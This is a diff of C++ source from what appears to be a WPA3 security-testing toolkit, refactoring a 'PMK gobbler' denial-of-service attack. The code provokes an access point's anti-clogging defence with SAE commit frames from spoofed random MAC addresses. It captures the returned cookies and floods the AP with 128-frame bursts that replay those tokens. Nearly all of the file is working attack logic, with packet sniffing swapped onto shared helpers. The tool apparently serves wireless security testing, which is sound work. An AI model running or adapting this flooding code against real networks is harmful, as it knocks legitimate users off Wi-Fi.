@@ -1,11 +1,10 @@
 #include "attacks/DoS_hard/PMK_gobbler/pmk_gobbler.h"
 
-#include <tins/tins.h>
-#include <poll.h>
-#include <cerrno>
-#include <thread>
 #include <chrono>
+#include <thread>
 #include <utility>
+#include <tins/tins.h>
+
 #include "inteprrupt.h"
 #include "attacks/components/sniffer_helper.h"
 #include "attacks/DoS_hard/cookie_guzzler/capture_commit_values.h"
@@ -21,118 +20,79 @@ using namespace Tins;
 using namespace chrono;
 
 namespace wpa3_tester::pmk_gobbler{
-optional<ACMCookie> parse_acm_response(const uint8_t *packet, const uint32_t len){
-	const auto sae = dos_helpers::parse_sae_commit(packet, len);
-	if(!sae) return nullopt;
-	const uint16_t radiotap_len = *reinterpret_cast<const uint16_t *>(packet + 2);
-	if(len < static_cast<uint32_t>(radiotap_len + 10)) return nullopt;
+optional<ACMCookie> parse_acm_response(const vector<uint8_t> &packet){
+	const auto sae = dos_helpers::parse_sae_commit(packet);
+	if(!sae || sae->token.empty()) return nullopt;
 
-	ACMCookie entry;
-	entry.sta_mac = HWAddress<6>(packet + radiotap_len + 4); // addr1 = destination STA
-	entry.token = sae->token;
-	return entry;
+	const uint16_t radiotap_len = *reinterpret_cast<const uint16_t *>(packet.data() + 2);
+	if(packet.size() < static_cast<size_t>(radiotap_len + 10)) return nullopt;
+
+	return ACMCookie{
+		.sta_mac = HWAddress<6>(packet.data() + radiotap_len + 4),
+		.token   = sae->token
+	};
 }
 
-// TODO tyhle smyšky s poll jsou hrozné, udělat, nějak je generalizavat a zkrášlit ?
 void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, CookieStore &store){
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t *handle = pcap_open_live(sniff_iface.c_str(), 2000, 1, 0, errbuf);
-	if(!handle) throw runtime_error("pcap_open_live failed: " + string(errbuf));
-	auto handle_guard = unique_ptr<pcap_t,void(*)(pcap_t *)>(handle, pcap_close);
-
-	pcap_setnonblock(handle, 1, errbuf);
-
 	const string filter = "wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string();
-	bpf_program fp{};
-	if(pcap_compile(handle, &fp, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) < 0)
-		throw runtime_error("pcap_compile failed: " + string(pcap_geterr(handle)));
-	pcap_setfilter(handle, &fp);
-	pcap_freecode(&fp);
 
-	const int fd = pcap_get_selectable_fd(handle);
-	if(fd == -1) throw runtime_error("pcap fd not selectable");
-	pollfd pfd = {.fd = fd, .events = POLLIN, .revents = 0};
+	components::poll_sniffer_pdu<monostate>(
+		[&](const PDU &pdu) -> optional<monostate> {
+			if(store.stop.load()) return monostate{};
 
-	log(LogLevel::INFO, "Cookie capture started on " + sniff_iface);
+			const auto *raw_pdu = pdu.find_pdu<RawPDU>();
+			if(!raw_pdu) return nullopt;
 
-	while(!store.stop.load()){
-		const int ret = poll(&pfd, 1, 100);
-		if(ret < 0){
-			if(errno == EINTR) continue;
-			log(LogLevel::WARNING, "capture poll error: " + to_string(errno));
-			break;
-		}
-		if(ret == 0 || !(pfd.revents & POLLIN)) continue;
-
-		pcap_pkthdr *header;
-		const uint8_t *packet;
-		while(pcap_next_ex(handle, &header, &packet) == 1){
-			if(auto entry = parse_acm_response(packet, header->caplen)){
+			if(auto entry = parse_acm_response(raw_pdu->payload())){
 				lock_guard lock(store.mtx);
-				const auto [it, inserted] = store.queue.insert_or_assign(entry->sta_mac.to_string(), *entry);
-				if(inserted){
-					log(LogLevel::DEBUG, "Cookie captured for {}, queue size {}", entry->sta_mac.to_string(),
-						store.queue.size());
-				}
+				const auto [it, inserted] = store.queue.insert_or_assign(
+					entry->sta_mac.to_string(), *entry);
+				if(inserted)
+					log(LogLevel::DEBUG, "Cookie captured for {}, queue size {}",
+						entry->sta_mac.to_string(), store.queue.size());
 			}
-		}
-	}
+			return nullopt;
+		},
+		sniff_iface, filter, nullopt
+	);
+
 	log(LogLevel::INFO, "Cookie capture stopped");
 }
 
-pair<ACMCookie,int> trigger_acm(const string &iface, const string &att_mac, const HWAddress<6> &ap_mac,
-								const int trigger_count, const dos_helpers::SAEPair &sae_params
-){
+pair<ACMCookie, int> trigger_acm(const string &iface, const string &att_mac, const HWAddress<6> &ap_mac,
+								  const int trigger_count, const dos_helpers::SAEPair &sae_params){
 	PacketSender sender(iface);
 
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t *handle = pcap_open_live(iface.c_str(), 2000, 1, 0, errbuf);
-	if(!handle) throw runtime_error("pcap_open_live failed: " + string(errbuf));
-	auto handle_guard = unique_ptr<pcap_t,void(*)(pcap_t *)>(handle, pcap_close);
-
-	pcap_setnonblock(handle, 1, errbuf);
-
-	const string filter = "wlan type mgt subtype auth";
-	bpf_program fp{};
-	if(pcap_compile(handle, &fp, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) < 0)
-		throw runtime_error("pcap_compile failed: " + string(pcap_geterr(handle)));
-	pcap_setfilter(handle, &fp);
-	pcap_freecode(&fp);
-
-	const int fd = pcap_get_selectable_fd(handle);
-	if(fd == -1) throw runtime_error("pcap fd not selectable");
-	pollfd pfd = {.fd = fd, .events = POLLIN, .revents = 0};
+	SnifferConfiguration cfg;
+	cfg.set_immediate_mode(true);
+	cfg.set_filter("wlan type mgt subtype auth");
+	Sniffer sniffer(iface, cfg);
 
 	log(LogLevel::INFO, "Triggering ACM (max {} frames)...", trigger_count);
+
 	for(int i = 0; i < trigger_count; ++i){
-		auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_random_ath_masker_mac(att_mac)), sae_params);
+		auto frame = make_sae_commit(ap_mac,
+			HWAddress<6>(firmware::get_random_ath_masker_mac(att_mac)), sae_params);
 		sender.send(frame);
 
-		const auto deadline = steady_clock::now() + milliseconds(5);
-		while(steady_clock::now() < deadline){
-			const int remaining_ms = duration_cast<milliseconds>(deadline - steady_clock::now()).count();
-			const int ret = poll(&pfd, 1, max(remaining_ms, 0));
-			if(ret < 0){
-				if(errno == EINTR) continue;
-				log(LogLevel::WARNING, "trigger poll error: " + to_string(errno));
-				break;
-			}
-
-			if(ret == 0 || !(pfd.revents & POLLIN)) continue;
-
-			pcap_pkthdr *header;
-			const uint8_t *packet;
-			if(pcap_next_ex(handle, &header, &packet) == 1){
-				if(auto cookie = parse_acm_response(packet, header->caplen)){
-					if(cookie->token.empty()) continue;
-					log(LogLevel::INFO, "ACM confirmed active after " + to_string(i) + " frames");
-					return {std::move(*cookie), i};
+		auto result = components::poll_sniffer<ACMCookie>(
+			sniffer.get_pcap_handle(), milliseconds(5),
+			[&](const uint8_t *packet, const uint32_t caplen) -> optional<ACMCookie> {
+				if(auto cookie = parse_acm_response({packet, packet + caplen})){
+					if(!cookie->token.empty()) return cookie;
 				}
+				return nullopt;
 			}
+		);
+
+		if(holds_alternative<ACMCookie>(result)){
+			log(LogLevel::INFO, "ACM confirmed active after {} frames", i);
+			return {get<ACMCookie>(result), i};
 		}
 	}
 	throw run_err("ACM not activated after " + to_string(trigger_count) + " frames");
 }
+
 
 void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddress<6> &ap_mac, CookieStore &store,
 						const int attack_time_sec, const dos_helpers::SAEPair &sae_params
@@ -145,25 +105,26 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
 	log(LogLevel::INFO, "Burst phase started, duration: {}s", attack_time_sec);
 
 	while(steady_clock::now() < end_time){
-		ACMCookie entry;
+		optional<ACMCookie> entry;
 		{
 			lock_guard lock(store.mtx);
-			if(store.queue.empty()){
-				this_thread::sleep_for(milliseconds(50));
-				//FIXME mají se doplňovat?
-				auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_random_ath_masker_mac(sta_mac)),
-											sae_params);
-				sender.send(frame);
-				continue;
+			if(!store.queue.empty()){
+				const auto it = store.queue.begin();
+				entry = std::move(it->second);
+				store.queue.erase(it);
 			}
-			const auto it = store.queue.begin();
-			entry = std::move(it->second);
-			store.queue.erase(it);
 		}
 
-		auto new_sae_params = sae_params;
-		new_sae_params.token = entry.token;
-		auto frame = make_sae_commit(ap_mac, entry.sta_mac, new_sae_params);
+		if(!entry){
+			this_thread::sleep_for(milliseconds(50));
+			auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_random_ath_masker_mac(sta_mac)), sae_params);
+			sender.send(frame);
+			continue;
+		}
+
+		auto burst_params = sae_params;
+		burst_params.token = entry->token;
+		auto frame = make_sae_commit(ap_mac, entry->sta_mac, burst_params);
 
 		constexpr size_t BURST_SIZE = 128;
 		for(size_t i = 0; i < BURST_SIZE; ++i){
@@ -173,12 +134,8 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
 		sent += BURST_SIZE;
 
 		if(sent >= next_log){
-			size_t q_size;
-			{
-				lock_guard l(store.mtx);
-				q_size = store.queue.size();
-			}
-			log(LogLevel::DEBUG, "Sent: {}, cookies remaining: {}", sent, q_size);
+			lock_guard l(store.mtx);
+			log(LogLevel::DEBUG, "Sent: {}, cookies remaining: {}", sent, store.queue.size());
 			next_log += 500;
 		}
 	}
